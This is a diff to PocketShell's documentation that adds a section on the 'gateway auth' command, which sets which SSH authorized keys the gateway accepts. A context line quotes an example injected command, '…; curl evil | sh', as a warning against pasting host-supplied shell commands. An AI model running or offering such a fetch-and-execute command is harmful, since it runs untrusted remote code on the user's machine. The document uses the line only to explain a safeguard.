@@ -447,6 +447,27 @@ client's strict pin parser — deliberately **not** a ready-to-run shell
 command (a compromised host could otherwise hand you `…; curl evil | sh` to
 paste). Compare the fingerprint on both ends.
 
+### 5.1 Gateway auth policy: `pocketshell gateway auth`
+
+Choose which authorized keys gateway SSH accepts on this host (key vault,
+needs a `pocketshell-link` built from pocketshell-gateway `70f5a4b` or later):
+
+```bash
+pocketshell gateway auth show [--json]
+pocketshell gateway auth set --policy host|managed|both [--keys-stdin] [--json] < vault-keys.pub
+```
+
+`host` means `~/.ssh/authorized_keys`, `managed` means a PocketShell-managed
+file of vault public keys (`--keys-stdin` replaces it with authorized_keys
+lines; empty input clears it), and `both` means both. Without a policy the
+private endpoint config decides, as before. A change applies to the next
+connection. Only the private exec endpoint can enforce `managed`. An invalid
+policy refuses connections and never falls back to accepting more keys.
+Private keys, key options and certificates are refused. Run it on the host, or
+over an SSH session you already have. The gateway never relays it, so an
+account token alone cannot add a login key. The helper contract is
+documented in pocketshell-gateway `docs/tunnel.md`.
+
 ## 6. Docker / local development gateways
 
 Against a gateway running locally or in Docker (plain `ws://`, no TLS), the
